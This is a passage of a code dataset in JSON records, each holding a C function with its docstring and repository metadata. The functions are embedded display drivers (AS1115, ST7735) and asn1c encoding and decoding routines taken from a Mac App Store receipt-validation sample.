{"docstring": "/**************************************************************************/\n/*! \n    @brief  Sends a single command byte over I2C to the specified address\n*/\n/**************************************************************************/\n", "func_signal": "as1115Error_t as1115WriteCmd (uint8_t address, uint8_t cmd)", "code": "{\n  // Clear write buffers\n  uint32_t i;\n  for ( i = 0; i < I2C_BUFSIZE; i++ )\n  {\n    I2CMasterBuffer[i] = 0x00;\n  }\n\n  // ToDo: Add real I2C error checking\n  I2CWriteLength = 2;\n  I2CReadLength = 0;\n  I2CMasterBuffer[0] = address;               // device sub address\n  I2CMasterBuffer[1] = cmd;                   // Command register\n  i2cEngine();\n  return AS1115_ERROR_OK;\n}", "path": "drivers\\displays\\segment\\as1115\\as1115.c", "repo_name": "microbuilder/LPC1343CodeBase", "stars": 73, "license": "other", "language": "c", "size": 3836}
{"docstring": "/*************************************************/\n", "func_signal": "void lcdInit(void)", "code": "{\n  // Set control pins to output\n  gpioSetDir(ST7735_PORT, ST7735_RS_PIN, 1);\n  gpioSetDir(ST7735_PORT, ST7735_SDA_PIN, 1);\n  gpioSetDir(ST7735_PORT, ST7735_SCL_PIN, 1);\n  gpioSetDir(ST7735_PORT, ST7735_CS_PIN, 1);\n  gpioSetDir(ST7735_PORT, ST7735_RES_PIN, 1);\n  gpioSetDir(ST7735_PORT, ST7735_BL_PIN, 1);\n\n  // Set pins low by default (except reset)\n  CLR_RS;\n  CLR_SDA;\n  CLR_SCL;\n  CLR_CS;\n  CLR_BL;\n  SET_RES;\n  \n  // Turn backlight on\n  lcdBacklight(TRUE);\n\n  // Reset display\n  SET_RES;\n  systickDelay(50);\n  CLR_RES;\n  systickDelay(50);\n  SET_RES;\n  systickDelay(50);\n\n  // Run LCD init sequence\n  st7735InitDisplay();\n\n  // Fill black\n  lcdFillRGB(COLOR_BLACK);\n}", "path": "drivers\\displays\\tft\\hw\\st7735.c", "repo_name": "microbuilder/LPC1343CodeBase", "stars": 73, "license": "other", "language": "c", "size": 3836}
{"docstring": "/*\n * Put the normally small non-negative whole number.\n * X.691, #10.6\n */\n", "func_signal": "int\nuper_put_nsnnwn(asn_per_outp_t *po, int n)", "code": "{\n\tint bytes;\n\n\tif(n <= 63) {\n\t\tif(n < 0) return -1;\n\t\treturn per_put_few_bits(po, n, 7);\n\t}\n\tif(n < 256)\n\t\tbytes = 1;\n\telse if(n < 65536)\n\t\tbytes = 2;\n\telse if(n < 256 * 65536)\n\t\tbytes = 3;\n\telse\n\t\treturn -1;\t/* This is not a \"normally small\" value */\n\tif(per_put_few_bits(po, bytes, 8))\n\t\treturn -1;\n\n\treturn per_put_few_bits(po, n, 8 * bytes);\n}", "path": "asn1\\per_support.c", "repo_name": "AlanQuatermain/mac-app-store-validation-sample", "stars": 107, "license": "None", "language": "c", "size": 856}
{"docstring": "/*\n * A variant of the der_encode() which encodes the data into the provided buffer\n */\n", "func_signal": "asn_enc_rval_t\nder_encode_to_buffer(asn_TYPE_descriptor_t *type_descriptor, void *struct_ptr,\n\tvoid *buffer, size_t buffer_size)", "code": "{\n\tenc_to_buf_arg arg;\n\tasn_enc_rval_t ec;\n\n\targ.buffer = buffer;\n\targ.left = buffer_size;\n\n\tec = type_descriptor->der_encoder(type_descriptor,\n\t\tstruct_ptr,\t/* Pointer to the destination structure */\n\t\t0, 0, encode_to_buffer_cb, &arg);\n\tif(ec.encoded != -1) {\n\t\tassert(ec.encoded == (ssize_t)(buffer_size - arg.left));\n\t\t/* Return the encoded contents size */\n\t}\n\treturn ec;\n}", "path": "asn1\\der_encoder.c", "repo_name": "AlanQuatermain/mac-app-store-validation-sample", "stars": 107, "license": "None", "language": "c", "size": 856}
{"docstring": "/*\n * Internal functions.\n */\n", "func_signal": "static asn_dec_rval_t\nuper_sot_suck(asn_codec_ctx_t *ctx, asn_TYPE_descriptor_t *td,\n\tasn_per_constraints_t *constraints, void **sptr, asn_per_data_t *pd)", "code": "{\n\tasn_dec_rval_t rv;\n\n\t(void)ctx;\n\t(void)td;\n\t(void)constraints;\n\t(void)sptr;\n\n\twhile(per_get_few_bits(pd, 24) >= 0);\n\n\trv.code = RC_OK;\n\trv.consumed = pd->moved;\n\n\treturn rv;\n}", "path": "asn1\\per_opentype.c", "repo_name": "AlanQuatermain/mac-app-store-validation-sample", "stars": 107, "license": "None", "language": "c", "size": 856}
{"docstring": "/*\n * Put a small number of bits (<= 31).\n */\n", "func_signal": "int\nper_put_few_bits(asn_per_outp_t *po, uint32_t bits, int obits)", "code": "{\n\tsize_t off;\t/* Next after last bit offset */\n\tsize_t omsk;\t/* Existing last byte meaningful bits mask */\n\tuint8_t *buf;\n\n\tif(obits <= 0 || obits >= 32) return obits ? -1 : 0;\n\n\tASN_DEBUG(\"[PER put %d bits %x to %p+%d bits]\",\n\t\t\tobits, (int)bits, po->buffer, po->nboff);\n\n\t/*\n\t * Normalize position indicator.\n\t */\n\tif(po->nboff >= 8) {\n\t\tpo->buffer += (po->nboff >> 3);\n\t\tpo->nbits  -= (po->nboff & ~0x07);\n\t\tpo->nboff  &= 0x07;\n\t}\n\n\t/*\n\t * Flush whole-bytes output, if necessary.\n\t */\n\tif(po->nboff + obits > po->nbits) {\n\t\tint complete_bytes = (po->buffer - po->tmpspace);\n\t\tASN_DEBUG(\"[PER output %d complete + %d]\",\n\t\t\tcomplete_bytes, po->flushed_bytes);\n\t\tif(po->outper(po->tmpspace, complete_bytes, po->op_key) < 0)\n\t\t\treturn -1;\n\t\tif(po->nboff)\n\t\t\tpo->tmpspace[0] = po->buffer[0];\n\t\tpo->buffer = po->tmpspace;\n\t\tpo->nbits = 8 * sizeof(po->tmpspace);\n\t\tpo->flushed_bytes += complete_bytes;\n\t}\n\n\t/*\n\t * Now, due to sizeof(tmpspace), we are guaranteed large enough space.\n\t */\n\tbuf = po->buffer;\n\tomsk = ~((1 << (8 - po->nboff)) - 1);\n\toff = (po->nboff += obits);\n\n\t/* Clear data of debris before meaningful bits */\n\tbits &= (((uint32_t)1 << obits) - 1);\n\n\tASN_DEBUG(\"[PER out %d %u/%x (t=%d,o=%d) %x&%x=%x]\", obits,\n\t\t(int)bits, (int)bits,\n\t\tpo->nboff - obits, off, buf[0], omsk&0xff, buf[0] & omsk);\n\n\tif(off <= 8)\t/* Completely within 1 byte */\n\t\tbits <<= (8 - off),\n\t\tbuf[0] = (buf[0] & omsk) | bits;\n\telse if(off <= 16)\n\t\tbits <<= (16 - off),\n\t\tbuf[0] = (buf[0] & omsk) | (bits >> 8),\n\t\tbuf[1] = bits;\n\telse if(off <= 24)\n\t\tbits <<= (24 - off),\n\t\tbuf[0] = (buf[0] & omsk) | (bits >> 16),\n\t\tbuf[1] = bits >> 8,\n\t\tbuf[2] = bits;\n\telse if(off <= 31)\n\t\tbits <<= (32 - off),\n\t\tbuf[0] = (buf[0] & omsk) | (bits >> 24),\n\t\tbuf[1] = bits >> 16,\n\t\tbuf[2] = bits >> 8,\n\t\tbuf[3] = bits;\n\telse {\n\t\tASN_DEBUG(\"->[PER out split %d]\", obits);\n\t\tper_put_few_bits(po, bits >> 8, 24);\n\t\tper_put_few_bits(po, bits, obits - 24);\n\t\tASN_DEBUG(\"<-[PER out split %d]\", obits);\n\t}\n\n\tASN_DEBUG(\"[PER out %u/%x => %02x buf+%d]\",\n\t\t(int)bits, (int)bits, buf[0], po->buffer - po->tmpspace);\n\n\treturn 0;\n}", "path": "asn1\\per_support.c", "repo_name": "AlanQuatermain/mac-app-store-validation-sample", "stars": 107, "license": "None", "language": "c", "size": 856}
{"docstring": "/*\n * Output a large number of bits.\n */\n", "func_signal": "int\nper_put_many_bits(asn_per_outp_t *po, const uint8_t *src, int nbits)", "code": "{\n\n\twhile(nbits) {\n\t\tuint32_t value;\n\n\t\tif(nbits >= 24) {\n\t\t\tvalue = (src[0] << 16) | (src[1] << 8) | src[2];\n\t\t\tsrc += 3;\n\t\t\tnbits -= 24;\n\t\t\tif(per_put_few_bits(po, value, 24))\n\t\t\t\treturn -1;\n\t\t} else {\n\t\t\tvalue = src[0];\n\t\t\tif(nbits > 8)\n\t\t\t\tvalue = (value << 8) | src[1];\n\t\t\tif(nbits > 16)\n\t\t\t\tvalue = (value << 8) | src[2];\n\t\t\tif(nbits & 0x07)\n\t\t\t\tvalue >>= (8 - (nbits & 0x07));\n\t\t\tif(per_put_few_bits(po, value, nbits))\n\t\t\t\treturn -1;\n\t\t\tbreak;\n\t\t}\n\t}\n\n\treturn 0;\n}", "path": "asn1\\per_support.c", "repo_name": "AlanQuatermain/mac-app-store-validation-sample", "stars": 107, "license": "None", "language": "c", "size": 856}
{"docstring": "/*\n * Encode the NativeInteger using the standard INTEGER type DER encoder.\n */\n", "func_signal": "asn_enc_rval_t\nNativeInteger_encode_der(asn_TYPE_descriptor_t *sd, void *ptr,\n\tint tag_mode, ber_tlv_tag_t tag,\n\tasn_app_consume_bytes_f *cb, void *app_key)", "code": "{\n\tunsigned long native = *(unsigned long *)ptr;\t/* Disable sign ext. */\n\tasn_enc_rval_t erval;\n\tINTEGER_t tmp;\n\n#ifdef\tWORDS_BIGENDIAN\t\t/* Opportunistic optimization */\n\n\ttmp.buf = (uint8_t *)&native;\n\ttmp.size = sizeof(native);\n\n#else\t/* Works even if WORDS_BIGENDIAN is not set where should've been */\n\tuint8_t buf[sizeof(native)];\n\tuint8_t *p;\n\n\t/* Prepare a fake INTEGER */\n\tfor(p = buf + sizeof(buf) - 1; p >= buf; p--, native >>= 8)\n\t\t*p = (uint8_t)native;\n\n\ttmp.buf = buf;\n\ttmp.size = sizeof(buf);\n#endif\t/* WORDS_BIGENDIAN */\n\t\n\t/* Encode fake INTEGER */\n\terval = INTEGER_encode_der(sd, &tmp, tag_mode, tag, cb, app_key);\n\tif(erval.encoded == -1) {\n\t\tassert(erval.structure_ptr == &tmp);\n\t\terval.structure_ptr = ptr;\n\t}\n\treturn erval;\n}", "path": "asn1\\NativeInteger.c", "repo_name": "AlanQuatermain/mac-app-store-validation-sample", "stars": 107, "license": "None", "language": "c", "size": 856}
{"docstring": "/*\n * Check the set of <TL<TL<TL...>>> tags matches the definition.\n */\n", "func_signal": "asn_dec_rval_t\nber_check_tags(asn_codec_ctx_t *opt_codec_ctx,\n\t\tasn_TYPE_descriptor_t *td, asn_struct_ctx_t *opt_ctx,\n\t\tconst void *ptr, size_t size, int tag_mode, int last_tag_form,\n\t\tber_tlv_len_t *last_length, int *opt_tlv_form)", "code": "{\n\tssize_t consumed_myself = 0;\n\tssize_t tag_len;\n\tssize_t len_len;\n\tber_tlv_tag_t tlv_tag;\n\tber_tlv_len_t tlv_len;\n\tber_tlv_len_t limit_len = -1;\n\tint expect_00_terminators = 0;\n\tint tlv_constr = -1;\t/* If CHOICE, opt_tlv_form is not given */\n\tint step = opt_ctx ? opt_ctx->step : 0;\t/* Where we left previously */\n\tint tagno;\n\n\t/*\n\t * Make sure we didn't exceed the maximum stack size.\n\t */\n\tif(_ASN_STACK_OVERFLOW_CHECK(opt_codec_ctx))\n\t\tRETURN(RC_FAIL);\n\n\t/*\n\t * So what does all this implicit skip stuff mean?\n\t * Imagine two types,\n\t * \tA ::= [5] IMPLICIT\tT\n\t * \tB ::= [2] EXPLICIT\tT\n\t * Where T is defined as\n\t *\tT ::= [4] IMPLICIT SEQUENCE { ... }\n\t * \n\t * Let's say, we are starting to decode type A, given the\n\t * following TLV stream: <5> <0>. What does this mean?\n\t * It means that the type A contains type T which is,\n\t * in turn, empty.\n\t * Remember though, that we are still in A. We cannot\n\t * just pass control to the type T decoder. Why? Because\n\t * the type T decoder expects <4> <0>, not <5> <0>.\n\t * So, we must make sure we are going to receive <5> while\n\t * still in A, then pass control to the T decoder, indicating\n\t * that the tag <4> was implicitly skipped. The decoder of T\n\t * hence will be prepared to treat <4> as valid tag, and decode\n\t * it appropriately.\n\t */\n\n\ttagno = step\t/* Continuing where left previously */\n\t\t+ (tag_mode==1?-1:0)\n\t\t;\n\tASN_DEBUG(\"ber_check_tags(%s, size=%ld, tm=%d, step=%d, tagno=%d)\",\n\t\ttd->name, (long)size, tag_mode, step, tagno);\n\t/* assert(td->tags_count >= 1) May not be the case for CHOICE or ANY */\n\n\tif(tag_mode == 0 && tagno == td->tags_count) {\n\t\t/*\n\t\t * This must be the _untagged_ ANY type,\n\t\t * which outermost tag isn't known in advance.\n\t\t * Fetch the tag and length separately.\n\t\t */\n\t\ttag_len = ber_fetch_tag(ptr, size, &tlv_tag);\n\t\tswitch(tag_len) {\n\t\tcase -1: RETURN(RC_FAIL);\n\t\tcase 0: RETURN(RC_WMORE);\n\t\t}\n\t\ttlv_constr = BER_TLV_CONSTRUCTED(ptr);\n\t\tlen_len = ber_fetch_length(tlv_constr,\n\t\t\t(const char *)ptr + tag_len, size - tag_len, &tlv_len);\n\t\tswitch(len_len) {\n\t\tcase -1: RETURN(RC_FAIL);\n\t\tcase 0: RETURN(RC_WMORE);\n\t\t}\n\t\tASN_DEBUG(\"Advancing %ld in ANY case\",\n\t\t\t(long)(tag_len + len_len));\n\t\tADVANCE(tag_len + len_len);\n\t} else {\n\t\tassert(tagno < td->tags_count);\t/* At least one loop */\n\t}\n\tfor((void)tagno; tagno < td->tags_count; tagno++, step++) {\n\n\t\t/*\n\t\t * Fetch and process T from TLV.\n\t\t */\n\t\ttag_len = ber_fetch_tag(ptr, size, &tlv_tag);\n\t\t\tASN_DEBUG(\"Fetching tag from {%p,%ld}: \"\n\t\t\t\t\"len %ld, step %d, tagno %d got %s\",\n\t\t\t\tptr, (long)size,\n\t\t\t\t(long)tag_len, step, tagno,\n\t\t\t\tber_tlv_tag_string(tlv_tag));\n\t\tswitch(tag_len) {\n\t\tcase -1: RETURN(RC_FAIL);\n\t\tcase 0: RETURN(RC_WMORE);\n\t\t}\n\n\t\ttlv_constr = BER_TLV_CONSTRUCTED(ptr);\n\n\t\t/*\n\t\t * If {I}, don't check anything.\n\t\t * If {I,B,C}, check B and C unless we're at I.\n\t\t */\n\t\tif(tag_mode != 0 && step == 0) {\n\t\t\t/*\n\t\t\t * We don't expect tag to match here.\n\t\t\t * It's just because we don't know how the tag\n\t\t\t * is supposed to look like.\n\t\t\t */\n\t\t} else {\n\t\t    assert(tagno >= 0);\t/* Guaranteed by the code above */\n\t\t    if(tlv_tag != td->tags[tagno]) {\n\t\t\t/*\n\t\t\t * Unexpected tag. Too bad.\n\t\t\t */\n\t\t    \tASN_DEBUG(\"Expected: %s, \"\n\t\t\t\t\"expectation failed (tn=%d, tm=%d)\",\n\t\t\t\tber_tlv_tag_string(td->tags[tagno]),\n\t\t\t\ttagno, tag_mode\n\t\t\t);\n\t\t\tRETURN(RC_FAIL);\n\t\t    }\n\t\t}\n\n\t\t/*\n\t\t * Attention: if there are more tags expected,\n\t\t * ensure that the current tag is presented\n\t\t * in constructed form (it contains other tags!).\n\t\t * If this one is the last one, check that the tag form\n\t\t * matches the one given in descriptor.\n\t\t */\n\t\tif(tagno < (td->tags_count - 1)) {\n\t\t\tif(tlv_constr == 0) {\n\t\t\t\tASN_DEBUG(\"tlv_constr = %d, expfail\",\n\t\t\t\t\ttlv_constr);\n\t\t\t\tRETURN(RC_FAIL);\n\t\t\t}\n\t\t} else {\n\t\t\tif(last_tag_form != tlv_constr\n\t\t\t&& last_tag_form != -1) {\n\t\t\t\tASN_DEBUG(\"last_tag_form %d != %d\",\n\t\t\t\t\tlast_tag_form, tlv_constr);\n\t\t\t\tRETURN(RC_FAIL);\n\t\t\t}\n\t\t}\n\n\t\t/*\n\t\t * Fetch and process L from TLV.\n\t\t */\n\t\tlen_len = ber_fetch_length(tlv_constr,\n\t\t\t(const char *)ptr + tag_len, size - tag_len, &tlv_len);\n\t\tASN_DEBUG(\"Fetchinig len = %ld\", (long)len_len);\n\t\tswitch(len_len) {\n\t\tcase -1: RETURN(RC_FAIL);\n\t\tcase 0: RETURN(RC_WMORE);\n\t\t}\n\n\t\t/*\n\t\t * FIXME\n\t\t * As of today, the chain of tags\n\t\t * must either contain several indefinite length TLVs,\n\t\t * or several definite length ones.\n\t\t * No mixing is allowed.\n\t\t */\n\t\tif(tlv_len == -1) {\n\t\t\t/*\n\t\t\t * Indefinite length.\n\t\t\t */\n\t\t\tif(limit_len == -1) {\n\t\t\t\texpect_00_terminators++;\n\t\t\t} else {\n\t\t\t\tASN_DEBUG(\"Unexpected indefinite length \"\n\t\t\t\t\t\"in a chain of definite lengths\");\n\t\t\t\tRETURN(RC_FAIL);\n\t\t\t}\n\t\t\tADVANCE(tag_len + len_len);\n\t\t\tcontinue;\n\t\t} else {\n\t\t\tif(expect_00_terminators) {\n\t\t\t\tASN_DEBUG(\"Unexpected definite length \"\n\t\t\t\t\t\"in a chain of indefinite lengths\");\n\t\t\t\tRETURN(RC_FAIL);\n\t\t\t}\n\t\t}\n\n\t\t/*\n\t\t * Check that multiple TLVs specify ever decreasing length,\n\t\t * which is consistent.\n\t\t */\n\t\tif(limit_len == -1) {\n\t\t\tlimit_len    = tlv_len + tag_len + len_len;\n\t\t\tif(limit_len < 0) {\n\t\t\t\t/* Too great tlv_len value? */\n\t\t\t\tRETURN(RC_FAIL);\n\t\t\t}\n\t\t} else if(limit_len != tlv_len + tag_len + len_len) {\n\t\t\t/*\n\t\t\t * Inner TLV specifies length which is inconsistent\n\t\t\t * with the outer TLV's length value.\n\t\t\t */\n\t\t\tASN_DEBUG(\"Outer TLV is %ld and inner is %ld\",\n\t\t\t\t(long)limit_len, (long)tlv_len);\n\t\t\tRETURN(RC_FAIL);\n\t\t}\n\n\t\tADVANCE(tag_len + len_len);\n\n\t\tlimit_len -= (tag_len + len_len);\n\t\tif((ssize_t)size > limit_len) {\n\t\t\t/*\n\t\t\t * Make sure that we won't consume more bytes\n\t\t\t * from the parent frame than the inferred limit.\n\t\t\t */\n\t\t\tsize = limit_len;\n\t\t}\n\t}\n\n\tif(opt_tlv_form)\n\t\t*opt_tlv_form = tlv_constr;\n\tif(expect_00_terminators)\n\t\t*last_length = -expect_00_terminators;\n\telse\n\t\t*last_length = tlv_len;\n\n\tRETURN(RC_OK);\n}", "path": "asn1\\ber_decoder.c", "repo_name": "AlanQuatermain/mac-app-store-validation-sample", "stars": 107, "license": "None", "language": "c", "size": 856}
{"docstring": "/*\n * Get the normally small length \"n\".\n * This procedure used to decode length of extensions bit-maps\n * for SET and SEQUENCE types.\n */\n", "func_signal": "ssize_t\nuper_get_nslength(asn_per_data_t *pd)", "code": "{\n\tssize_t length;\n\n\tASN_DEBUG(\"Getting normally small length\");\n\n\tif(per_get_few_bits(pd, 1) == 0) {\n\t\tlength = per_get_few_bits(pd, 6) + 1;\n\t\tif(length <= 0) return -1;\n\t\tASN_DEBUG(\"l=%d\", length);\n\t\treturn length;\n\t} else {\n\t\tint repeat;\n\t\tlength = uper_get_length(pd, -1, &repeat);\n\t\tif(length >= 0 && !repeat) return length;\n\t\treturn -1; /* Error, or do not support >16K extensions */\n\t}\n}", "path": "asn1\\per_support.c", "repo_name": "AlanQuatermain/mac-app-store-validation-sample", "stars": 107, "license": "None", "language": "c", "size": 856}
{"docstring": "/*\n * INTEGER specific human-readable output.\n */\n", "func_signal": "int\nNativeInteger_print(asn_TYPE_descriptor_t *td, const void *sptr, int ilevel,\n\tasn_app_consume_bytes_f *cb, void *app_key)", "code": "{\n\tasn_INTEGER_specifics_t *specs=(asn_INTEGER_specifics_t *)td->specifics;\n\tconst long *native = (const long *)sptr;\n\tchar scratch[32];\t/* Enough for 64-bit int */\n\tint ret;\n\n\t(void)td;\t/* Unused argument */\n\t(void)ilevel;\t/* Unused argument */\n\n\tif(native) {\n\t\tret = snprintf(scratch, sizeof(scratch),\n\t\t\t(specs && specs->field_unsigned)\n\t\t\t? \"%lu\" : \"%ld\", *native);\n\t\tassert(ret > 0 && (size_t)ret < sizeof(scratch));\n\t\treturn (cb(scratch, ret, app_key) < 0) ? -1 : 0;\n\t} else {\n\t\treturn (cb(\"<absent>\", 8, app_key) < 0) ? -1 : 0;\n\t}\n}", "path": "asn1\\NativeInteger.c", "repo_name": "AlanQuatermain/mac-app-store-validation-sample", "stars": 107, "license": "None", "language": "c", "size": 856}
{"docstring": "/*\n * Decode the chunk of XML text encoding INTEGER.\n */\n", "func_signal": "asn_dec_rval_t\nNativeInteger_decode_xer(asn_codec_ctx_t *opt_codec_ctx,\n\tasn_TYPE_descriptor_t *td, void **sptr, const char *opt_mname,\n\t\tconst void *buf_ptr, size_t size)", "code": "{\n\tasn_INTEGER_specifics_t *specs=(asn_INTEGER_specifics_t *)td->specifics;\n\tasn_dec_rval_t rval;\n\tINTEGER_t st;\n\tvoid *st_ptr = (void *)&st;\n\tlong *native = (long *)*sptr;\n\n\tif(!native) {\n\t\tnative = (long *)(*sptr = CALLOC(1, sizeof(*native)));\n\t\tif(!native) _ASN_DECODE_FAILED;\n\t}\n\n\tmemset(&st, 0, sizeof(st));\n\trval = INTEGER_decode_xer(opt_codec_ctx, td, &st_ptr, \n\t\topt_mname, buf_ptr, size);\n\tif(rval.code == RC_OK) {\n\t\tlong l;\n\t\tif((specs&&specs->field_unsigned)\n\t\t\t? asn_INTEGER2ulong(&st, &l)\n\t\t\t: asn_INTEGER2long(&st, &l)) {\n\t\t\trval.code = RC_FAIL;\n\t\t\trval.consumed = 0;\n\t\t} else {\n\t\t\t*native = l;\n\t\t}\n\t} else {\n\t\t/*\n\t\t * Cannot restart from the middle;\n\t\t * there is no place to save state in the native type.\n\t\t * Request a continuation from the very beginning.\n\t\t */\n\t\trval.consumed = 0;\n\t}\n\tASN_STRUCT_FREE_CONTENTS_ONLY(asn_DEF_INTEGER, &st);\n\treturn rval;\n}", "path": "asn1\\NativeInteger.c", "repo_name": "AlanQuatermain/mac-app-store-validation-sample", "stars": 107, "license": "None", "language": "c", "size": 856}
{"docstring": "/* Append bytes to the above structure */\n", "func_signal": "static int _el_addbytes(const void *buffer, size_t size, void *el_buf_ptr)", "code": "{\n\tstruct _el_buffer *el_buf = (struct _el_buffer *)el_buf_ptr;\n\n\tif(el_buf->length + size > el_buf->size)\n\t\treturn -1;\n\n\tmemcpy(el_buf->buf + el_buf->length, buffer, size);\n\n\tel_buf->length += size;\n\treturn 0;\n}", "path": "asn1\\constr_SET_OF.c", "repo_name": "AlanQuatermain/mac-app-store-validation-sample", "stars": 107, "license": "None", "language": "c", "size": 856}
{"docstring": "/*\n * Decode INTEGER type.\n */\n", "func_signal": "asn_dec_rval_t\nNativeInteger_decode_ber(asn_codec_ctx_t *opt_codec_ctx,\n\tasn_TYPE_descriptor_t *td,\n\tvoid **nint_ptr, const void *buf_ptr, size_t size, int tag_mode)", "code": "{\n\tasn_INTEGER_specifics_t *specs=(asn_INTEGER_specifics_t *)td->specifics;\n\tlong *native = (long *)*nint_ptr;\n\tasn_dec_rval_t rval;\n\tber_tlv_len_t length;\n\n\t/*\n\t * If the structure is not there, allocate it.\n\t */\n\tif(native == NULL) {\n\t\tnative = (long *)(*nint_ptr = CALLOC(1, sizeof(*native)));\n\t\tif(native == NULL) {\n\t\t\trval.code = RC_FAIL;\n\t\t\trval.consumed = 0;\n\t\t\treturn rval;\n\t\t}\n\t}\n\n\tASN_DEBUG(\"Decoding %s as INTEGER (tm=%d)\",\n\t\ttd->name, tag_mode);\n\n\t/*\n\t * Check tags.\n\t */\n\trval = ber_check_tags(opt_codec_ctx, td, 0, buf_ptr, size,\n\t\t\ttag_mode, 0, &length, 0);\n\tif(rval.code != RC_OK)\n\t\treturn rval;\n\n\tASN_DEBUG(\"%s length is %d bytes\", td->name, (int)length);\n\n\t/*\n\t * Make sure we have this length.\n\t */\n\tbuf_ptr = ((const char *)buf_ptr) + rval.consumed;\n\tsize -= rval.consumed;\n\tif(length > (ber_tlv_len_t)size) {\n\t\trval.code = RC_WMORE;\n\t\trval.consumed = 0;\n\t\treturn rval;\n\t}\n\n\t/*\n\t * ASN.1 encoded INTEGER: buf_ptr, length\n\t * Fill the native, at the same time checking for overflow.\n\t * If overflow occured, return with RC_FAIL.\n\t */\n\t{\n\t\tINTEGER_t tmp;\n\t\tunion {\n\t\t\tconst void *constbuf;\n\t\t\tvoid *nonconstbuf;\n\t\t} unconst_buf;\n\t\tlong l;\n\n\t\tunconst_buf.constbuf = buf_ptr;\n\t\ttmp.buf = (uint8_t *)unconst_buf.nonconstbuf;\n\t\ttmp.size = length;\n\n\t\tif((specs&&specs->field_unsigned)\n\t\t\t? asn_INTEGER2ulong(&tmp, &l)\n\t\t\t: asn_INTEGER2long(&tmp, &l)) {\n\t\t\trval.code = RC_FAIL;\n\t\t\trval.consumed = 0;\n\t\t\treturn rval;\n\t\t}\n\n\t\t*native = l;\n\t}\n\n\trval.code = RC_OK;\n\trval.consumed += length;\n\n\tASN_DEBUG(\"Took %ld/%ld bytes to encode %s (%ld)\",\n\t\t(long)rval.consumed, (long)length, td->name, (long)*native);\n\n\treturn rval;\n}", "path": "asn1\\NativeInteger.c", "repo_name": "AlanQuatermain/mac-app-store-validation-sample", "stars": 107, "license": "None", "language": "c", "size": 856}
{"docstring": "/*\n * Free the contents of the set, do not free the set itself.\n */\n", "func_signal": "void\nasn_set_empty(void *asn_set_of_x)", "code": "{\n\tasn_anonymous_set_ *as = _A_SET_FROM_VOID(asn_set_of_x);\n\n\tif(as) {\n\t\tif(as->array) {\n\t\t\tif(as->free) {\n\t\t\t\twhile(as->count--)\n\t\t\t\t\tas->free(as->array[as->count]);\n\t\t\t}\n\t\t\tFREEMEM(as->array);\n\t\t\tas->array = 0;\n\t\t}\n\t\tas->count = 0;\n\t\tas->size = 0;\n\t}\n\n}", "path": "asn1\\asn_SET_OF.c", "repo_name": "AlanQuatermain/mac-app-store-validation-sample", "stars": 107, "license": "None", "language": "c", "size": 856}
{"docstring": "/*\n * Put the normally small length \"n\" into the stream.\n * This procedure used to encode length of extensions bit-maps\n * for SET and SEQUENCE types.\n */\n", "func_signal": "int\nuper_put_nslength(asn_per_outp_t *po, size_t length)", "code": "{\n\n\tif(length <= 64) {\n\t\t/* #10.9.3.4 */\n\t\tif(length == 0) return -1;\n\t\treturn per_put_few_bits(po, length-1, 7) ? -1 : 0;\n\t} else {\n\t\tif(uper_put_length(po, length) != (ssize_t)length) {\n\t\t\t/* This might happen in case of >16K extensions */\n\t\t\treturn -1;\n\t\t}\n\t}\n\n\treturn 0;\n}", "path": "asn1\\per_support.c", "repo_name": "AlanQuatermain/mac-app-store-validation-sample", "stars": 107, "license": "None", "language": "c", "size": 856}
{"docstring": "/*\n * Put the length \"n\" (or part of it) into the stream.\n */\n", "func_signal": "ssize_t\nuper_put_length(asn_per_outp_t *po, size_t length)", "code": "{\n\n\tif(length <= 127)\t/* #10.9.3.6 */\n\t\treturn per_put_few_bits(po, length, 8)\n\t\t\t? -1 : (ssize_t)length;\n\telse if(length < 16384)\t/* #10.9.3.7 */\n\t\treturn per_put_few_bits(po, length|0x8000, 16)\n\t\t\t? -1 : (ssize_t)length;\n\n\tlength >>= 14;\n\tif(length > 4) length = 4;\n\n\treturn per_put_few_bits(po, 0xC0 | length, 8)\n\t\t\t? -1 : (ssize_t)(length << 14);\n}", "path": "asn1\\per_support.c", "repo_name": "AlanQuatermain/mac-app-store-validation-sample", "stars": 107, "license": "None", "language": "c", "size": 856}
{"docstring": "/*\n * Add another element into the set.\n */\n", "func_signal": "int\nasn_set_add(void *asn_set_of_x, void *ptr)", "code": "{\n\tasn_anonymous_set_ *as = _A_SET_FROM_VOID(asn_set_of_x);\n\n\tif(as == 0 || ptr == 0) {\n\t\terrno = EINVAL;\t\t/* Invalid arguments */\n\t\treturn -1;\n\t}\n\n\t/*\n\t * Make sure there's enough space to insert an element.\n\t */\n\tif(as->count == as->size) {\n\t\tint _newsize = as->size ? (as->size << 1) : 4;\n\t\tvoid *_new_arr;\n\t\t_new_arr = REALLOC(as->array, _newsize * sizeof(as->array[0]));\n\t\tif(_new_arr) {\n\t\t\tas->array = (void **)_new_arr;\n\t\t\tas->size = _newsize;\n\t\t} else {\n\t\t\t/* ENOMEM */\n\t\t\treturn -1;\n\t\t}\n\t}\n\n\tas->array[as->count++] = ptr;\n\n\treturn 0;\n}", "path": "asn1\\asn_SET_OF.c", "repo_name": "AlanQuatermain/mac-app-store-validation-sample", "stars": 107, "license": "None", "language": "c", "size": 856}
{"docstring": "/*\n * The DER encoder of the SET OF type.\n */\n", "func_signal": "asn_enc_rval_t\nSET_OF_encode_der(asn_TYPE_descriptor_t *td, void *ptr,\n\tint tag_mode, ber_tlv_tag_t tag,\n\tasn_app_consume_bytes_f *cb, void *app_key)", "code": "{\n\tasn_TYPE_member_t *elm = td->elements;\n\tasn_TYPE_descriptor_t *elm_type = elm->type;\n\tder_type_encoder_f *der_encoder = elm_type->der_encoder;\n\tasn_anonymous_set_ *list = _A_SET_FROM_VOID(ptr);\n\tsize_t computed_size = 0;\n\tssize_t encoding_size = 0;\n\tstruct _el_buffer *encoded_els;\n\tssize_t eels_count = 0;\n\tsize_t max_encoded_len = 1;\n\tasn_enc_rval_t erval;\n\tint ret;\n\tint edx;\n\n\tASN_DEBUG(\"Estimating size for SET OF %s\", td->name);\n\n\t/*\n\t * Gather the length of the underlying members sequence.\n\t */\n\tfor(edx = 0; edx < list->count; edx++) {\n\t\tvoid *memb_ptr = list->array[edx];\n\t\tif(!memb_ptr) continue;\n\t\terval = der_encoder(elm_type, memb_ptr, 0, elm->tag, 0, 0);\n\t\tif(erval.encoded == -1)\n\t\t\treturn erval;\n\t\tcomputed_size += erval.encoded;\n\n\t\t/* Compute maximum encoding's size */\n\t\tif(max_encoded_len < (size_t)erval.encoded)\n\t\t\tmax_encoded_len = erval.encoded;\n\t}\n\n\t/*\n\t * Encode the TLV for the sequence itself.\n\t */\n\tencoding_size = der_write_tags(td, computed_size, tag_mode, 